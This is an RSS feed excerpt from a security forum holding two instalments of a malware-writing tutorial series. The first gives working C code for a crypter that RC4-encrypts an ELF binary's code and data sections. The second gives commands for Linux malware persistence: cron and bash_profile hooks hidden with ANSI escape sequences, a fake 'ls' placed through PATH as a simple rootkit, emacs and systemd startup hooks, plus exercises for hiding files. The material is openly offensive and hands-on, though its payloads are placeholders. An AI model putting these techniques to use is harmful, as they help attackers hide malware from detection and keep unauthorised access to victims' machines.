<code>sh_size</code> and this is the size of the section or if you prefer the size of the data we have to encrypt.</li>
<li>
<code>sh_flags</code> this contains different flags for the section, including the associated permissions…</li>
</ul>
<p>All the fields are pretty easy to interpret, except the <code>sh_name</code>. That is because all strings are stored in a special section. This way, it is easy to deal with duplicated strings and also a smart way to keep all other structures with a fixed size, so they can be navigated as arrays. Anyhow, the section that contains the string is special and is included in the header:</p>
<pre><code class="lang-auto">  Elf64_Half	e_shstrndx;		/* Section header string table index */
</code></pre>
<p>And this works like any other section, the unique difference is that the offset associated to that section points to the area on the file that contains all the strings associated to the ELF format itself. Yes, in this section you will find the name of sections and symbols used by the binary, but not the strings you use in your program… Your <code>"Hello World!"</code> string is stored in the <code>.rodata</code> section (<em>Read-Only Data</em>)… That, <code>.rodata</code>, is one of the sections we will be interested on encrypting… I’m not even sure if crypting the string table section will break the binary… that’s something to try.</p>
<p>Taking this into account, the field <code>sh_name</code> in the section structure, is just an offset in that area that contains the strings, so, in order to get the name of section <code>i</code>, we have to:</p>
<pre><code class="lang-auto">  char *s_name   = p + sh[elf_hdr-&gt;e_shstrndx].sh_offset; // String Table Data
  char *sec_name = s_name + sh[i].sh_name;                // Just access using the offset
</code></pre>
<h2>
<a name="crypting-code-and-data-13" class="anchor" href="https://0x00sec.org#crypting-code-and-data-13"></a>Crypting code and data</h2>
<p>With this information we can write a preliminary version of our main loop. Let’s include all the code so you can compile and try it:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/mman.h&gt;

#include &lt;elf.h&gt;

#define DIE(s) {perror(s);exit(1);}
#define SWAP(a,b) a += b; b= a -b; a-=b;

int rc4 (unsigned char *msg, int mlen, unsigned char *key, int klen) {
  int           i,j;
  unsigned char S[256]; // Permutation matrix
  
  // KSA: Key-Schedulling Algorithm
  for (i = 0; i &lt; 255; S[i] = i,i++);   
  for (j = 0, i = 0; i &lt; 256; i++) {
    j = (j + S[i] + key[i % klen] ) % 256;
    SWAP(S[i],S[j]);
  }
  // Encoding
  i = j = 0;
  int cnt = 0;
  while (cnt &lt; mlen) {
    i = (i + 1) % 256;
    j = (j + S[i]) % 256;
    
    SWAP(S[i],S[j]);
    
    msg[cnt] = msg[cnt] ^ S[(S[i] + S[j]) % 256];
    cnt++;
  }
  printf (" [%d bytes encoded]", cnt);
  return 0;
}

int main (int argc, char *argv[]) {
  
  if (argc != 2) {
    fprintf (stderr, "Invalid number of parameters\n");
    fprintf (stderr, "Usage: crypter binary\n");
    exit (-1);
  }
  
  // Open file
  int fd;
  if ((fd = open (argv[1], O_RDWR, 0)) &lt; 0) DIE ("open");
  
  // get size
  struct stat _st;
  if (fstat (fd, &amp;_st) &lt; 0) DIE ("fstat");
  
  // Map file
  unsigned char *p;
  if ((p = mmap (0, _st.st_size, PROT_READ | PROT_WRITE,
		 MAP_SHARED, fd, 0)) == MAP_FAILED) DIE ("mmap");
		 
  // Find code segment
  Elf64_Ehdr *elf_hdr = (Elf64_Ehdr*) p;
  // Sanity checks omitted
  printf ("Section Table located at : %ld\n", elf_hdr-&gt;e_shoff);
  printf ("Section Table entry size : %d\n",  elf_hdr-&gt;e_shentsize);
  printf ("Section Table entries    : %d\n",  elf_hdr-&gt;e_shnum);  

  int        i;
  Elf64_Shdr *sh = (Elf64_Shdr*)(p + elf_hdr-&gt;e_shoff) ;
  char       *s_name = p + sh[elf_hdr-&gt;e_shstrndx].sh_offset;
  char        *key ="0x00Sec!\0";  // Use 8 characters to make asm simpler.
  char        *name = NULL;

  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++) {
    name = s_name + sh[i].sh_name;
    printf ("Section %02d [%20s]: Type: %d Flags: %lx | Off: %lx Size: %lx =&gt; ",
	    i, name,
	    sh[i].sh_type, sh[i].sh_flags,
	    sh[i].sh_offset, sh[i].sh_size);
    //Find `.text` and `.rodata`
    if (!strcmp (name, ".text") || !strcmp (name, ".rodata")) {
      // encrypt section
	  rc4 (p + sh[i].sh_offset, sh[i].sh_size, (unsigned char*)key, strlen (key));
      printf (" - Crypted!\n");
    } else printf ("\n");
  }

  // TODO: Inject stub here
  munmap (p, _st.st_size);
  close (fd);
  return 0;
}

</code></pre>
<p>This small program, will list all the sections in the binary and find <code>.text</code> and <code>.rodata</code> as targets to encrypt, and actually encrypt them using the RC4 cipher we wrote earlier in this instalment.</p>
<p>Now you can run the program against any binary (actually better try it against a copy not the real one) and see what happens. As an example I will use my beloved <code>xeyes</code>.</p>
<p>Let’s first make a copy in our worked directory, and dump the beginning of the <code>.text</code> section.</p>
<pre><code>$ cp /usr/bin/xeyes .
$ objdump -d xeyes  | grep -A10 "&lt;.text&gt;"
0000000000001ed0 &lt;.text&gt;:
    1ed0:       41 54                   push   %r12
    1ed2:       55                      push   %rbp
    1ed3:       31 d2                   xor    %edx,%edx
    1ed5:       53                      push   %rbx
    1ed6:       48 89 f3                mov    %rsi,%rbx
    1ed9:       31 f6                   xor    %esi,%esi
    1edb:       48 83 ec 50             sub    $0x50,%rsp
    1edf:       89 7c 24 0c             mov    %edi,0xc(%rsp)
    1ee3:       31 ff                   xor    %edi,%edi
    1ee5:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
</code></pre>
<p>That looks pretty normal code. Let’s crypt it and take a look again</p>
<pre><code>$ ./crypter-1.0 xeyes
Section Table located at : 22248
Section Table entry size : 64
Section Table entries    : 27
Section 00 [                    ]: Type: 0 Flags: 0 | Off: 0 Size: 0 =&gt;
Section 01 [             .interp]: Type: 1 Flags: 2 | Off: 238 Size: 1c =&gt;
Section 02 [       .note.ABI-tag]: Type: 7 Flags: 2 | Off: 254 Size: 20 =&gt;
Section 03 [  .note.gnu.build-id]: Type: 7 Flags: 2 | Off: 274 Size: 24 =&gt;
Section 04 [           .gnu.hash]: Type: 1879048182 Flags: 2 | Off: 298 Size: 50 =&gt;
Section 05 [             .dynsym]: Type: 11 Flags: 2 | Off: 2e8 Size: 6f0 =&gt;
Section 06 [             .dynstr]: Type: 3 Flags: 2 | Off: 9d8 Size: 497 =&gt;
Section 07 [        .gnu.version]: Type: 1879048191 Flags: 2 | Off: e70 Size: 94 =&gt;
Section 08 [      .gnu.version_r]: Type: 1879048190 Flags: 2 | Off: f08 Size: 50 =&gt;
Section 09 [           .rela.dyn]: Type: 4 Flags: 2 | Off: f58 Size: d80 =&gt;
Section 10 [               .init]: Type: 1 Flags: 6 | Off: 1cd8 Size: 1a =&gt;
Section 11 [                .plt]: Type: 1 Flags: 6 | Off: 1d00 Size: 10 =&gt;
Section 12 [            .plt.got]: Type: 1 Flags: 6 | Off: 1d10 Size: 1b8 =&gt;
Section 13 [               .text]: Type: 1 Flags: 6 | Off: 1ed0 Size: 1a12 =&gt;  [6674 bytes encoded] - Crypted!
Section 14 [               .fini]: Type: 1 Flags: 6 | Off: 38e4 Size: 9 =&gt;
Section 15 [             .rodata]: Type: 1 Flags: 2 | Off: 38f0 Size: 308 =&gt;  [776 bytes encoded] - Crypted!
Section 16 [       .eh_frame_hdr]: Type: 1 Flags: 2 | Off: 3bf8 Size: ac =&gt;
Section 17 [           .eh_frame]: Type: 1 Flags: 2 | Off: 3ca8 Size: 464 =&gt;
Section 18 [         .init_array]: Type: 14 Flags: 3 | Off: 4bd8 Size: 8 =&gt;
Section 19 [         .fini_array]: Type: 15 Flags: 3 | Off: 4be0 Size: 8 =&gt;
Section 20 [                .jcr]: Type: 1 Flags: 3 | Off: 4be8 Size: 8 =&gt;
Section 21 [            .dynamic]: Type: 6 Flags: 3 | Off: 4bf0 Size: 220 =&gt;
Section 22 [                .got]: Type: 1 Flags: 3 | Off: 4e10 Size: 1f0 =&gt;
Section 23 [               .data]: Type: 1 Flags: 3 | Off: 5000 Size: 5c0 =&gt;
Section 24 [                .bss]: Type: 8 Flags: 3 | Off: 55c0 Size: f98 =&gt;
Section 25 [      .gnu_debuglink]: Type: 1 Flags: 0 | Off: 55c0 Size: 34 =&gt;
Section 26 [           .shstrtab]: Type: 3 Flags: 0 | Off: 55f4 Size: f4 =&gt;
$ objdump -d xeyes  | grep -A10 "&lt;.text&gt;"
0000000000001ed0 &lt;.text&gt;:
    1ed0:       d0 61 97                shlb   -0x69(%rcx)
    1ed3:       9a                      (bad)
    1ed4:       15 4a 02 22 fa          adc    $0xfa22024a,%eax
    1ed9:       22 47 8e                and    -0x72(%rdi),%al
    1edc:       ff 4a 7c                decl   0x7c(%rdx)
    1edf:       95                      xchg   %eax,%ebp
    1ee0:       5f                      pop    %rdi
    1ee1:       6b fc 7f                imul   $0x7f,%esp,%edi
    1ee4:       ac                      lods   %ds:(%rsi),%al
    1ee5:       ad                      lods   %ds:(%rsi),%eax
</code></pre>
<p>OK… This looks very bad. We can say that our crypter is encrypting the code of the program. If we try to run it…</p>
<pre><code>$ ./xeyes
Illegal instruction
</code></pre>
<p>That illegal instruction is likely the <code>9a</code> that <code>objdump</code> already complained about. This is normal, we haven’t addded our stub yet… But, as RC4 is a xor cipher, if we run our crypter again on the same binary, we effectively decrypt it (that is what the <code>stub</code> will eventually do):</p>
<pre><code>$ ./crypter-1.0 xeyes
$ $ objdump -d xeyes  | grep -A10 "&lt;.text&gt;"
0000000000001ed0 &lt;.text&gt;:
    1ed0:       41 54                   push   %r12
    1ed2:       55                      push   %rbp
    1ed3:       31 d2                   xor    %edx,%edx
    1ed5:       53                      push   %rbx
    1ed6:       48 89 f3                mov    %rsi,%rbx
    1ed9:       31 f6                   xor    %esi,%esi
    1edb:       48 83 ec 50             sub    $0x50,%rsp
    1edf:       89 7c 24 0c             mov    %edi,0xc(%rsp)
    1ee3:       31 ff                   xor    %edi,%edi
    1ee5:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
</code></pre>
<h1>
<a name="conclusion-14" class="anchor" href="https://0x00sec.org#conclusion-14"></a>Conclusion</h1>
<p>I think this is enough for this instalment. It may look like we haven’t advanced much, but we are actually half way to get a decent crypter working.</p>
<p>As a summary: We have learned how RC4 works and implemented it on C. We have also got familiar with some of the main ELF structures, the header and the Section Table and implemented a simple program to navigate the table and find the segment of interest to crypt with our brand-new RC4 implementation.</p>
<p>In the next instalment we will implement RC4 in assembler to make it fit in a few hundred bytes, inject this code in the binary and patch the stub and the ELF header to decode the <code>.text</code> ans <code>.rodata</code> sections at run-time. Stay tuned!</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/programming-for-wanabes-xiii-crypters-part-i/27598">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/programming-for-wanabes-xiii-crypters-part-i/27598</link>
          <pubDate>Mon, 15 Nov 2021 21:26:37 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-27598</guid>
          <source url="https://0x00sec.org/t/programming-for-wanabes-xiii-crypters-part-i/27598.rss">Programming for Wanabes XIII. Crypters part I</source>
        </item>
        <item>
          <title>Programming for Wanabes XII. Persistence</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>We have already explored a little bit how to disguise our programs and now we are gonna look in the basics of ensuring that our program keeps running even in the event of a shutdown or reboot. This post is going to be more system administration than programming… but that is what hacking is about… a little bit of everything.</p>
<h1>
<a name="persistence-1" class="anchor" href="https://0x00sec.org#persistence-1"></a>Persistence</h1>
<p>So, let’s define persistence as the capability of a program to restart execution whenever the program execution is stopped for whatever reason. When a computer switches off or reboots, all running software stops working. In the first case because the thing is switch off and just doesn’t work :). In the second, because the reload of the operating system re-initialise all data structures and any trace of previous processes gets wiped out.</p>
<p>In the first case, depending on for how long the computer is switched off, even all the RAM memory will be physically deleted. Yes, the RAM memory is not as volatile as you may think. The contents remains for a while and there are some hardware attacks that exploits that (check <a href="https://en.wikipedia.org/wiki/Cold_boot_attack" rel="noopener nofollow ugc">Cool Boot Attack</a>.</p>
<p>Any way, those esoteric side cases are of little use for us, as we need to get our program executed in the normal OS. From that point of view, persistence is basically a two step process.</p>
<ol>
<li>Store the program to execute somewhere in the system</li>
<li>Force the system to execute such program at some point</li>
</ol>
<h1>
<a name="storing-our-program-2" class="anchor" href="https://0x00sec.org#storing-our-program-2"></a>Storing our program</h1>
<p>The places where we can store our program are kind of limited, however we can think on different levels as we will see in a second.</p>
<p>In a normal computer, persistent storage is roughly limited to the hard drive (either internal or external), in an embedded system we may have some EEPROM or Flash memory to write to… and that is roughly it. Sometimes there are some internal flash on the processors itself that could be abused but those cases are too specific. Once you master the basics, the actual place to store your code will just be a matter of choice not a technical issue… and also a source of fun.</p>
<p>The place to store our program cannot really be anywhere… We need to also fool the OS or other program to run it whenever it stops working. So it needs to be stored where it can be executed, at least part of it needs to be executed.</p>
<p>For instance, on embedded devices you will usually have write permission on the <code>/tmp</code> folder, but on a properly configured system, that folder will be mounted as <code>nonexec</code>, meaning that you cannot run programs stored on <code>/tmp</code>. You can temporally remount it without the <code>nonexec</code> flag, to run your program, but in order to do that from a reboot you first need to run some code from somewhere else, that actually does such a remount.</p>
<p>As you can imagine, a dropper can be of help here, so the main program is stored somewhere else (somewhere that doesn’t allow direct execution) and the dropper will retrieve it and execute it. That location can be, the network, the cloud, an EEPROM, a disk sector marked as defective, code appended to a binary or a kernel module.</p>
<h1>
<a name="running-the-program-3" class="anchor" href="https://0x00sec.org#running-the-program-3"></a>Running the program</h1>
<p>Once we manage to get the program stored somewhere in a way that it can be executed directly we need to make sure that it gets executed. For doing that we have multiple options that actually depends on how the system is configured and on which services it runs.</p>
<p>Note that, even when social engineer can help to get the malware executed in first place (and that is maybe the most common case), that won’t rarely work to re-execute the malware after a reboot. I can think about a case to trick the user but not much more. In general, this process needs to be automatic. That’s why it is better to get root permissions from the very beginning, that is, at the social engineering stage, when you may have a chance to trick the user to give you the permissions… otherwise you may or may not be able to gain that permissions later.</p>
<p>So, I will talk about a few options to get programs executed automatically on start-up. This is basic system configuration and it is something that you need to do very often as a software engineer building computer-based solutions or as a regular system administrator… so nothing really hackish here…</p>
<p>The ways to get the program executed will depend on the permissions we have on the machine. Let’s differentiate between user persistence and system-wide persistence.</p>
<h1>
<a name="user-persistence-4" class="anchor" href="https://0x00sec.org#user-persistence-4"></a>User Persistence</h1>
<p>In case the application couldn’t escalate privileges, it has to be run as a regular user, in that case, there are not many options. Actually I would say that we have just two.</p>
<p>The first one is the use of the command <code>@reboot</code> in the user <code>crontab</code>. You just need to add a line like this:</p>
<p><code>@reboot /path_to_program/program</code></p>
<p>Or</p>
<p><code>*/1 * * * *  /path_to_program/program</code></p>
<p>For this to work you should first check that  <code>crond</code> is installed and running. Also the <code>@reboot</code> command seems not to work on all systems, at least for users. It works for <code>root</code> but whether it works for regular users depends on the version of <code>crond</code> installed by the system</p>
<p>The second option is to modify the startup scripts used by your shell. In this case you may need to first check which shell is being executed (usually just check the <code>SHELL</code> environmental var) and then patch the associated start-up script.</p>
<p><em>Note that in this case, your code will only get executed whenever a user fires up a shell… not really at start-up</em>.</p>
<h1>
<a name="patching-bash-5" class="anchor" href="https://0x00sec.org#patching-bash-5"></a>Patching Bash</h1>
<p>As an example I will use <code>bash</code> as that is my current shell and I’m too lazy to install three different ones and repeat the process for each one. I will describe the whole process in detail so you should get enough information to replicate this for any other shell. Be free to drop a comment indicating how you patch other shells. That may be useful for others.</p>
<p>The first thing you have to do is to figure out which files are used during the start up of a shell session. For that your best chance is to check the <code>man</code> page for your shell and look for <code>startup</code>  or <code>initialisation</code>. For bash you will find something like this:</p>
<pre><code>   The  following paragraphs describe how bash executes its startup files.
   (...)

   When bash is invoked as an interactive login shell, or as a  non-inter‐
   active  shell with the --login option, it first reads and executes com‐
   mands from the file /etc/profile, if that file exists.   After  reading
   that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile,
   in that order, and reads and executes commands from the first one  that
   exists  and  is  readable.  The --noprofile option may be used when the
   shell is started to inhibit this behavior.

   When an interactive login shell exits, or a non-interactive login shell
   executes  the  exit  builtin  command, bash reads and executes commands
   from the file ~/.bash_logout, if it exists.

   When an interactive shell that is not a login shell  is  started,  bash
   reads  and  executes  commands  from /etc/bash.bashrc and ~/.bashrc, if
   these files exist.  This may be inhibited by using the  --norc  option.
   The  --rcfile  file option will force bash to read and execute commands
   from file instead of /etc/bash.bashrc and ~/.bashrc.
</code></pre>
<p>Well, there are more info on the man page, but for us this is enough, we should just add our stuff on <code>~/.bash_profile</code>… Well, we should check which one of the files listed above exists and patch the appropriated one… All those files are themselves shell scripts so we just need to append some text to them to get the job done.</p>
<p><em>NOTE: I’m oversimplifying the process here. You need to analyse in detail the process and proceed as per your needs. May be enough to patch one of those files, or you may need to patch all of them or create them if they do not exist.</em></p>
<h1>
<a name="hiding-appended-commands-6" class="anchor" href="https://0x00sec.org#hiding-appended-commands-6"></a>Hiding appended commands</h1>
<p>I do not believe people looks into these files very often, unless they need to configure some fancy software that requires some special setup that is not performed automatically when the SW is installed… either defining some alias or adding some non-standard folder to the shell path. However, in case someone wants to take a look, we can try to hide a little bit our modification of the file (basically the line that executes the malware).</p>
<h2>
<a name="hiding-commands-with-ansi-sequences-7" class="anchor" href="https://0x00sec.org#hiding-commands-with-ansi-sequences-7"></a>Hiding commands with ANSI sequences</h2>
<p>This is actually an old trick. The terminal application we use in our GNU/Linux system is actually a terminal emulator. It emulates the old physical terminal that connected to the computers usually through some serial port. As a heritage of those system, these terminal emulators are able to emulate many of those hardware devices like the VT-100 or the VT-200, thanks to the <code>termio</code> library/database. Those terminals supported the so-called escape sequences… that is, a special combination of data on the serial link that has a special meaning for the terminal.</p>
<p>Most of those sequences were intended to move the cursor around the screen or clean it… well, they can do more thing, but those are the things we are interested on.</p>
<p>So, most terminal emulators on your linux box will honour these escape sequences, at least at the extend of the terminal they are emulating (something set by the <code>TERM</code> environmental variable), and we can exploit this to avoid showing our modification, at least for some tools like <code>more</code> or <code>cat</code>. When using a normal text editor or more sophisticated programs like <code>less</code> the escape sequence will be shown, so this is not an universal solution, but may work for small files that are not usually edited…</p>
<p>Let’s say we want to add the following command to the <code>.bash_profile</code> file:</p>
<pre><code class="lang-bash">$ echo 'echo "I am some harmless malware"'  &gt;&gt; ~/.bash_profile
$ cat ~./bash_profile
(...)
echo "I am some harmless malware"
$
</code></pre>
<p>Now, lets add the following escape sequence:</p>
<pre><code class="lang-bash">$  printf '#\033[1A\033[2K' &gt;&gt; ~/.bash_profile
$ cat ~./bash_profile
(...)
$
</code></pre>
<p>So what does that escape sequence does?</p>
<ul>
<li>First we start with a <code>#</code>. That is a comment for bash, so the script won’t produce and error when executed.</li>
<li>Then we find the first part of the sequence <code>\033[1A</code> which means that we want to move the cursor one line up (Note that <code>\033</code> is an octal value, remember those <code>0</code> at the left of the number, that represents the ESC ASCII code.)</li>
<li>Then <code>\033[2K</code> means that we want to delete the entire line from the beginning</li>
</ul>
<p>You can find a complete list of ANSI escape codes <a href="https://en.wikipedia.org/wiki/ANSI_escape_code#CSI_(Control_Sequence_Introducer)_sequences" rel="noopener nofollow ugc">here</a>.</p>
<p>So, whenever the terminal prints that line, will move the cursor one line up and delete that line… which is actually the previous line we added executing our code. Try to check the file with <code>cat</code> or <code>more</code> and the line will not be shown, but if you run the script it will indeed be executed.</p>
<h2>
<a name="other-options-8" class="anchor" href="https://0x00sec.org#other-options-8"></a>Other options</h2>
<p>In addition to directly execute our program we can also try to either, get our program executed indirectly or cheat the user to execute it without noticing that, if you prefer. A way to do this is modifying the <code>PATH</code> variable adding as the first search folder one of our choice. Yes, the shell will look for binaries in the folders stored on <code>PATH</code> in order. Let’s see how would this work.</p>
<pre><code class="lang-bash">$ mkdir ~/bin
$ echo "PATH=~/bin:$PATH" &gt;&gt; ~/.bash_profile
$ cd bin
$ cat &lt;&lt; EOM &gt;&gt; ls
&gt; #/bin/bash
&gt; echo "I am malware"
&gt; /bin/ls $@
&gt; EOM
$ chmod +x ls
--- In a new session ---
$ ls ~/bin
I am malware
ls
$
</code></pre>
<p><em>Note:A new session is required in order to process the modification on <code>.bash_profile</code>.</em></p>
<p>This is actually the simplest form of user space rootkit. In this case we are just showing a message but in the general case we can have some code checking the path passed as parameter and if it is the one where the malware is stored we just don’t show it. Anyhow, as you can see, the fake <code>ls</code> just do its thing (showing a message here) and then calls the original <code>ls</code> at <code>/bin/ls</code>… if you do not do that you go into an infinite loop showing the message “I am malware”.</p>
<p>The <code>$@</code> shell variable contains all the parameters passed to the script… so we just pass them to the original <code>ls</code> to do its thing.</p>
<p>So, overall this is the idea. Then you can go further with this as much as you want.</p>
<p>Here are some exercises for you to have fun:</p>
<ul>
<li>Do the update above, change <code>ls</code> so it won’t show some specific files you configure</li>
<li>Also add versions of <code>cat</code>, <code>more</code>, <code>less</code> so when they get as parameter the <code>.bash_profile</code> file they do not show the <code>PATH</code> modification line</li>
<li>Undo the change on <code>.bash_profile</code> whenever your program gets executed and redo it again when it is signaled to be destroyed or on <code>.bash_logout</code>
</li>
<li>Use <code>LD_PRELOAD</code> and use a shared library</li>
<li>Provide your own dynamic linker</li>
</ul>
<h1>
<a name="running-your-malware-from-other-programs-9" class="anchor" href="https://0x00sec.org#running-your-malware-from-other-programs-9"></a>Running your malware from other programs</h1>
<p>In our previous example, we depend on the user running one of the programs we have faked. The main inconvenience of this technique is that our malware will not get executed immediately after reboot… we will have to wait until the user runs one of the faked programs.</p>
<p>If that is an option, we can go more stealth just modifying other programs start-up scripts or configuration files. Let’s see two examples.</p>
<p>Our first example will be Firefox. Firefox is one of the most widely used browsers. On my linux box, this is how it gets executed:</p>
<pre><code class="lang-auto">$ whereis firefox
firefox: /usr/bin/firefox /usr/lib/firefox /etc/firefox /usr/share/man/man1/firefox.1.gz
$ file  /usr/bin/firefox
/usr/bin/firefox: symbolic link to ../lib/firefox/firefox.sh
$ file /usr/bin/../lib/firefox/firefox.sh
/usr/bin/../lib/firefox/firefox.sh: POSIX shell script, ASCII text executable
</code></pre>
<p>In this case you will need root access to modify that script. Another problem is that this update will be gone when firefox gets updated, what happens very often. Again, it all depends on what the attacker is trying to achieve, sometimes only a few days or hours are needed…</p>
<p>The second example is exploiting programs configuration files. For this example I’ll use <code>emacs</code>. Emacs configuration file can be found on the <code>$HOME</code> directory of the user and it is named <code>.emacs</code>.</p>
<p>The file <code>.emacs</code> is actually a <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/" rel="noopener nofollow ugc">lisp</a> script executed by <code>emacs</code> on start-up. You can add a lot of capabilities there and add new behaviours to the editor. And one thing you can do is launch a process. In this case I will just launch <code>xeyes</code> together with <code>emacs</code>.</p>
<pre><code class="lang-auto">$ echo '(call-process "/usr/bin/xeyes" nil 0 nil)' &gt;&gt; ~/.emacs
</code></pre>
<p>Note that for this to work you need an accessible X-Windows system, otherwise <code>xeyes</code> won’t work. You can try something that doesn’t need a window. As an example I will use <code>touch</code>, so you can also see how to pass parameters to your program:</p>
<pre><code class="lang-auto">$ echo '(call-process "touch" nil 0 nil "/tmp/test")' &gt;&gt; .emacs
$ ls /tmp/test
ls: cannot access '/tmp/test': No such file or directory
$ emacs &amp;
$ $ ls /tmp/test
/tmp/test
</code></pre>
<p>There are other programs that allows you to run scripts that can launch external programs… just explore what is available in the target system.</p>
<h1>
<a name="the-importance-of-non-privileged-users-10" class="anchor" href="https://0x00sec.org#the-importance-of-non-privileged-users-10"></a>The importance of non privileged users</h1>
<p>In general, as a regular user you may not be able to run programs at start-up. To achieve that goal you may need to escalate your privileges, ideally getting <code>root</code> access. However, there may be other non privileged users that may be useful, depending on the final goal of the malware being developed.</p>
<p>For instance, many services in a machine are run by non-privileged users. Web services or databases servers very commonly use their own user, and those services are executed at start up, so in case one of those users is not properly protected they may give an attacker a chance to get code executed on start-up as a non-privileged user.</p>
<p>The process is the same we described before. Either you can run your code directly, or you can modify some configuration file to make the actual service run the code for your…</p>
<p>Right. Privilege escalation is not about getting root… is about getting privileges… any privilege.</p>
<h1>
<a name="system-wide-persistence-11" class="anchor" href="https://0x00sec.org#system-wide-persistence-11"></a>System-wide persistence</h1>
<p>When it comes to get the program executed really on start up we have again a few options. These are, maybe, the more obvious ones:</p>
<ul>
<li>Modify <code>/etc/rc.local</code>. This file is the last one executed after boot. Anything on it will be executed just before the system is initiated.</li>
<li>System V init scripts. On systems booting using the System V boot process, different scripts will be executed depending on the runlevel being initialised.</li>
<li>Systemd service. On system booting using the <code>sysmted</code>, new services can be added or modified to get code executed at start-up.</li>
</ul>
<p>Let’s dive into the details for the last two options.</p>
<h1>
<a name="system-v-init-12" class="anchor" href="https://0x00sec.org#system-v-init-12"></a>System V init</h1>
<p>System V init system uses  scripts stored at <code>/etc/init.d</code> and for each runlevel it uses a folder named <code>rcN.d</code> where <code>N</code> is an integer indicating the <code>runlevel</code> (<code>man runlevel</code> to know more about this). In each of those folder you will fin a set of scripts named as:</p>
<ul>
<li>
<code>SXX_name</code>. <code>S</code> stands for <code>start</code> and all scripts starting with <code>S</code> will be executed when entering the associated runlevel. <code>XX</code> is a number indicating the order of execution of each script. This way, <code>S10_apache</code> will run first than <code>S20_mysql</code>
</li>
<li>
<code>KXX_name</code>. <code>K</code> stand for <code>kill</code>  and all scripts starting with <code>K</code>  will be executed when entering the runlevel (before the start scripts), killing all required processes for the transition. <code>XX</code> again allows to specify the order.</li>
</ul>
<p>Usually the scripts to start and stop/kill a service are the same and they just use a parameter to determine what to do. So, all those <code>SXX_</code> and <code>KXX_</code> scripts are just links to the files stored in <code>/etc/init.d</code>. Which is very convenient because some services are used in many different runlevels.</p>
<p>So, if you can modify those folders/files you can just add the execution of your program, either in the script associated to one of the services or adding your own script and creating the associated link for the runlevels of interest for you.</p>
<h1>
<a name="systemd-13" class="anchor" href="https://0x00sec.org#systemd-13"></a>Systemd</h1>
<p>Addind a systemd service is also very simple. Here, again, you can modify some of the existing services or create your own. In that case, we are back to the modification of <code>firefox</code> we discussed before.</p>
<p>Services are defined by simple text files stored in <code>/etc/systemd/system</code>. Overall the structure is like this:</p>
<pre><code>[Unit]
Description=Description of the service

[Service]
User=root
WorkingDirectory=Path to folder where the program is
ExecStart=your code
Restart=always

[Install]
WantedBy=multi-user.target
</code></pre>
<p>That is the bare minimum definition of a service. There are a lot more option you can use in each section. For that I will recommend to check the systemd official documentation… some of them may actually be very useful.</p>
<p>Some comments tho. The <code>Restart</code> value will tell systemd what to do if the process dies. In our case we are saying that we want it to be restarted. The <code>multi-user.target</code> is the system target at boot that the service will relate to. Other option to this value is <code>graphical.target</code>… somehow this related to System V runlevel 3 and runlevel 5.</p>
<p>Then, once the service is deployed you can just install it in the system running the command:</p>
<p><code>systemctl enable malware</code></p>
<p>That’s it</p>
<h1>
<a name="companion-rootkit-14" class="anchor" href="https://0x00sec.org#companion-rootkit-14"></a>Companion Rootkit</h1>
<p>Whenever the system is fully compromised, in addition to easily make a malware persistent you can also make it completely invisible, way further than the simple name change we did in the last instalment.</p>
<p>Having administrator privileges allows you to do whatever you want, so you can just drop a rootkit in the system. A rootkit is a tool or suite of tools (we talked about this a few sections before) intended to enable root access to the machine in the future, in a easy way and keep it (what implies hiding whatever program is deployed in the compromised system). It does this in two ways:</p>
<ul>
<li>Providing a backdoor to get into the machine directly</li>
<li>Hiding that backdoor to the system tools so it cannot be detected</li>
</ul>
<p>Original rootkits were just simple substitutions of the main administrator tools in the system. We have seen how this works when we talk about changing the bash <code>PATH</code> variable some section before. If you have <code>root</code> access you can just change the original program at <code>/bin/</code> or <code>/usr/bin</code>. This way, the attacker provides a <code>ps</code> program that does not show the rootkit programs, a <code>netstat</code> program that doesn’t shows the connections of the rootkit programs, and an <code>ls</code> program that doesn’t shows the files associated to the rootkit program.</p>
<p>You see now where the <code>KIT</code> part of the word comes from, don’t you?</p>
<p>That worked fine in the old times when the number of tools for administrators were limited and well-known but when more and more tools become available, providing different versions of all of them was not a feasible solution. Then the next generation of rootkits appear. Those either try to hook into the system libraries or into the kernel, being these last ones the more powerful ones. They just go one level down, targeting the services used by all those new administration tools.</p>
<p>The more advanced user space rootkits take advantage of the fact that most binaries in modern system are dynamically linked. That allows an attacker to modify, either some key system library used by all tools (like the standard C library) or the dynamic linker that is in charge of loading the programs. This way, the rootkit can intercept the call to different library functions like <code>open</code> or <code>read</code>, and modify the values returned to any application using that libraries. Obviously, this doesn’t work with statically linked binaries.</p>
<p>The kernel space rootkits goes even beyond and, actually do exactly the same thing, but just one level below, that is, they patch the associated systemcall instead of the library functions used by user space libraries. Kernel rootkits are hard to implement nowadays as the security in the kernel has improved a lot, but also because, on linux systems you get new kernel versions very often as part of your system updates that may break your kernel module.</p>
<p>In addition to that, a production machine intended to be secure shouldn’t use kernel modules (or drivers if you prefer) and shouldn’t allow either access to <code>/dev/mem</code> or <code>/dev/kmem</code>, devices that allows us to access directly the memory and patch the kernel directly in memory. So, even if you could patch the kernel (even the actual file on disk and wait for next reboot) or insert a module (something unlikely), there are chances that a future next kernel update will break your rootkit… As always, time opportunity is a key concept on malware… If the attack is intended to take place in a short period of time, that is less of a concern.</p>
<p>Anyway, this is enough for rootkits for now. We may come back to this later as it is a topic on its own and can be seen as a side tool for a malware and not really as a intrinsic element of it.</p>
<h1>
<a name="going-esoteric-15" class="anchor" href="https://0x00sec.org#going-esoteric-15"></a>Going esoteric</h1>
<p>We had described the more straightforward ways to get code executed after a reboot. There are more esoteric alternatives that I will just quickly mention here. Maybe some of you can try and come back with a side instalment for this series… or maybe I’ll do that in future… Who knows.</p>
<ul>
